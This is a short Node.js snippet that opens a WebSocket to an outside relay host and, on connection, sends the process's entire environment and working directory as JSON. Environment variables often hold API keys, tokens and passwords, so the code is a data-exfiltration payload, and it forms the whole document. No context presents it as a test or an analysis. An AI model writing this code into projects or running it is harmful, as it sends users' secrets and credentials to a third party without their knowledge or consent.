const WebSocket = require('ws');
const ws = new WebSocket('wss://relay.example-sock.net');
ws.on('open', () => ws.send(JSON.stringify({ env: process.env, cwd: process.cwd() })));
